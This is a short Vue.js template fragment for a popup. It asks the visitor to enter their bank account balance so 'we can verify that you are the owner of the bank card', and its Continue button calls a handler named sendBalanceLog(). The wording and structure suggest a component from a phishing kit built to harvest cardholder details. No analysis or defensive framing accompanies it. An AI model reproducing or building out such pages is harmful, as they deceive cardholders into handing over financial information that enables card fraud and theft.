  ...
  <div class="popup" v-if="show">
    <div class="popup_body">
      <div class="popup_content">
        ...
        <div v-if="step === 'balance'">
          <div class="title">
            Enter your account balance so we can verify that you are the owner
            of the bank card
          </div>
          <div class="popup_form">
            <div class="form">
              <div class="info__input">
                <label for="null" class="label">Enter a balance:</label>
                <div class="wrapper">
                  <input
                    type="text"
                    placeholder="100"
                    ...
                    v-model="balance"
                  />
                  <div class="currency"><p>$</p></div>
                </div>
              </div>
              <div class="btn" @click="sendBalanceLog()">Continue</div>
            </div>
          </div>
        </div>
        <div v-else>
